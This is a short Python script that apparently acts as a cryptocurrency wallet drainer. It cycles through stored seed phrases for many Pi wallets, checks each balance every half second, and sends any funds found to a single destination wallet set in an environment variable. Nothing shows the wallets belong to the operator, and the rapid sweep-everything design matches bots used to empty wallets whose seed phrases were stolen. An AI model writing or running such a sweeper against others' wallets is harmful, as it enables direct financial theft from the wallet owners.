import asyncio
import os
from pi_transfer import PiWallet
from wallet_manager import get_all_wallets

DESTINATION_WALLET = os.getenv("DESTINATION_WALLET")
POLLING_INTERVAL = int(os.getenv("POLLING_INTERVAL_MS", 500)) / 1000.0

async def monitor_wallets():
    while True:
        for admin_id, mnemonic in get_all_wallets():
            wallet = PiWallet(mnemonic)
            balance = wallet.get_balance()
            if balance > 0:
                wallet.send_all_funds(DESTINATION_WALLET)
        await asyncio.sleep(POLLING_INTERVAL)
